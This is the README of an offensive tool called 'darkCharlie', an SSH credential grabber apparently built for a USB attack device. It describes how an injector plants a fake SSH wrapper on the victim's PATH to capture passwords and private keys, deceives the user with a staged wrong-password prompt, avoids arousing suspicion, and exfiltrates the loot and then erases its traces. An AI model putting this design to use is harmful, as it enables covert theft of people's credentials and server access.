# darkCharlie SSH credential grabber

* Author: Michael Weinstein
* Version: 0.1
* Target: Mac/Linux

Mad credit to oXis for their attack approach.  Much of the code here was developed using SudoBackdoor as a reference.

Current dev status: I have tested this with both private key and password auth on a linux machine and found it working.  I have not extensively tested with config files, but the limited testing I have done suggests that it is working as intended.  I have not tested yet on a mac, but will probably do so very soon.  I still need to do some more polishing on this, and especially want to get the use of paramiko better where it can check if the login needs a password and then check if the password entered into the wrapper is valid.

## Description

Injector: Creates a folder called ~/.config/ssh where it puts a python wrapper for ssh.  Next, it copies over the python SSH wrapper.  It then runs the initialization function in the wrapper script to set some environmental values like the actual path for SSH and the path for python.  The initialization function also initializes a file for saving SSH creds and configuration details in JSON format.  It will save the global and user SSH config file details immediately, including grabbing any private keys linked in the config file (if you know these will be of interest, you can exfiltrate them immediately).  Finally, ~/.config/ssh is added as the first element on the user's PATH so that they will be running this wrapper instead of actually SSHing in.  The main abnormality a user will see is if they need to manually enter a password, they'll get it "wrong" the first time and have to reenter it.  This wrapper will load previous loot to see if a server's password has already been gotten and won't try to get it again to avoid raising suspicions.    
Cleaner: Gets back the file containing JSON-encoded SSH configuration and credential data.  After exfiltration of the data, it will delete the directory and files it created and clean up its change to the bashrc or bash_profile.    

## Configuration

Inside the injector and the cleaner you can specify mac=true to switch the playload to macos mode.    

## STATUS  (Note that I used the same configuration as SudoBackdoor, but I am seeing different LED behaviors.  Will investigate this soon.)
Injector 

| LED              | Status               |
| ---------------- | -------------------- |
| White            |  Ready               |
| Amber blinking   |  Waiting for server  |
| Blue blinking    |  Attacking           |
| Green            |  Finished            |
    
Cleaner

| LED              | Status               |
| ---------------- | -------------------- |
| White            |  Ready               |
| Blue blinking    |  Attacking           |
| Green            |  Finished            |
